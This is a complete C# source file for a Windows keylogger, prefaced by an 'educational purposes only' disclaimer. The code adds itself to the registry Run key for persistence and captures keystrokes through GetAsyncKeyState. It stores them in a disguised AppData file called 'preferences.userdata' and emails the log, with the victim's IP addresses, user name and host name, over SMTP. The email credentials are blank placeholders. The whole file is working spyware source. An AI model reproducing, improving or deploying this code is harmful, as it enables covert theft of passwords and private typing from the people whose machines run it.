//It is to be used for educational purposes only. The code is not efficient and can easily be detected. I am not responsible for your malicious activities.

using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace KeyLogger
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static string path = "";

        static void Main(string[] args)
        {
            if(args.Length == 1 && args[0] == "removeFromStartup")
            {
                RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                key.DeleteValue("KeyLogger", false);

                MessageBox.Show("Removed KeyLogger from startup", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }
            else
            {
                RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                key.SetValue("KeyLogger", Application.ExecutablePath);

                //WARNING
                string text = "A keylogger app is just started in your computer. Disable \"KeyLogger\" from Task Manager>Startup and restart your computer";
                MessageBox.Show(text, "Warning!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }

            string log = "";
            int charLimitToUpdate = 100;
            int charLimitToSend = 5000;
            int charCount = 0;
            bool isCapslockOn = false;

            string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            if (!Directory.Exists(folderPath))
            {
                Directory.CreateDirectory(folderPath);
            }
            path = folderPath + @"\preferences.userdata";

            List<int> pressedKeys = new List<int>();
            while (true)
            {
                Thread.Sleep(10);
                for (int key = 0; key < 128; key++)
                {
                    int state = GetAsyncKeyState(key);
                    bool alreadyPressed = pressedKeys.Contains(key);

                    if (state == 0 && alreadyPressed)
                    {
                        pressedKeys.Remove(key);
                        if (key == 16) log += 'Ğ';
                        if (key == 16) Console.WriteLine("Shift key down");
                    }
                    else if (state != 0 && !alreadyPressed)
                    {
                        pressedKeys.Add(key);
                        if (key == 20)
                            isCapslockOn = !isCapslockOn;

                        if (key >= 97 && key <= 122) key += 100;
                        char keyAsChar = (char)key;
                        bool isLowercase = isCapslockOn == (GetAsyncKeyState(16) != 0);
                        log += isLowercase ? Char.ToLower(keyAsChar) : keyAsChar;

                        charCount++;
                        if(charCount > charLimitToUpdate)
                        {
                            if (!File.Exists(path)) using (StreamWriter streamWriter = File.CreateText(path));
                            using (StreamWriter streamWriter = File.AppendText(path)) streamWriter.Write(log);
                            TrySendEmail(charLimitToSend);
                            charCount = 0;
                            log = "";
                        }
                    }
                }
            }
        }

        static private void TrySendEmail(int minLenght)
        {
            string log = File.ReadAllText(path);
            if (log.Length < minLenght) return;

            try
            {
                string mailAddress = "-";
                string mailPassword = "-";
                string smtpAddress = "-";
                int smtpPort = 000;

                string emailSubject = "-";
                string emailContent = string.Empty;

                var host = Dns.GetHostEntry(Dns.GetHostName());
                foreach (var item in host.AddressList)
                {
                    emailContent += "\nAddr: " + item.ToString() + ".";
                }

                emailContent += "U: " + Environment.UserDomainName + @"\" + Environment.UserName + "\nH: " + host + "\n" +
                                "T: " + DateTime.Now.ToString() + "\n\n" + log;

                SmtpClient client = new SmtpClient(smtpAddress, smtpPort);
                client.Credentials = new NetworkCredential(mailAddress, mailPassword);
                client.EnableSsl = true;

                MailMessage mailMessage = new MailMessage(mailAddress, mailAddress, emailSubject, emailContent);
                client.Send(mailMessage);

                File.WriteAllText(path, "");
            }
            catch (Exception) { }
        }
    }
}